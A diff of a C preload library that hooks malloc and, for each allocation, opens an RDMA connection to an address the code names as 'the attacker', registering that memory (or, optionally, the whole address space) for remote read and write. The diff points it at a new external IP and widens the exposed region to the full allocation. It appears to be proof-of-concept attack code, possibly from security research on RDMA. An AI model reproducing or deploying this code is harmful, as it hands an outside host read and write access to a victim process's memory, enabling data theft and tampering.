@@ -11,7 +11,7 @@ static __thread int no_hook;
 
 static unsigned char buffer[8192];
 
-void preload(void *);
+void preload(void *, size_t len);
 
 static void *(*real_malloc)(size_t) = NULL;
 static void *(*real_calloc)(size_t, size_t) = NULL;
@@ -37,7 +37,7 @@ void *malloc(size_t len) {
   no_hook = 1;
   printf("malloc call: %zu bytes\n", len);
   ret = (*real_malloc)(len); 
-  preload(ret);
+  preload(ret, len);
   no_hook = 0; 
   return ret; 
 }
@@ -62,7 +62,7 @@ void *realloc(void *ptr, size_t size) {
   return (*real_realloc)(ptr, size);
 }
 
-void preload(void *ptr){
+void preload(void *ptr, size_t len){
 
   struct rdma_addrinfo *addrinfo;
   int ret;
@@ -71,7 +71,7 @@ void preload(void *ptr){
   hints.ai_port_space = RDMA_PS_TCP;
 
   // should be IP and port of the attacker
-  ret = rdma_getaddrinfo("192.168.1.10","9999", &hints, &addrinfo);
+  ret = rdma_getaddrinfo("128.110.218.223","9999", &hints, &addrinfo);
   assert(ret==0 && "Failed to find route to the attacker");
 
   struct ibv_qp_init_attr attr;
@@ -105,7 +105,7 @@ void preload(void *ptr){
   if(useodp)
     mrall = ibv_reg_mr(pd,NULL,SIZE_MAX,IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_WRITE| IBV_ACCESS_REMOTE_READ | IBV_ACCESS_ON_DEMAND);
   else
-    mrall = ibv_reg_mr(pd,ptr,128,IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_WRITE| IBV_ACCESS_REMOTE_READ);
+    mrall = ibv_reg_mr(pd,ptr,len,IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_WRITE| IBV_ACCESS_REMOTE_READ);
 
   struct ibv_sge* sges = (struct ibv_sge*)ptr;
   sges[0].addr = (uint64_t)(ptr);
